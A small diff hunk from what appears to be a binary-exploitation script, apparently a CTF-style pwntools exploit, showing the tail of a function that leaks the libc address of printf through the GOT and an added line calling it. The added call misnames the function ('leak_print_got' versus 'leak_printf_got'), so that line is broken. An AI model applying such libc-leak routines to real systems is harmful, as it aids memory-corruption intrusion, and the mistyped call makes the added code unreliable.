@@ -143,3 +143,5 @@ def leak_printf_got(start_main_addr):
 	libc_printf = hex(u64(leak.ljust(8,b"\x00")))
 	print("[!!!] Leaked libc printf : " + libc_printf)
 	return int(libc_printf,16)
+
+print(leak_print_got(start_main_addr))
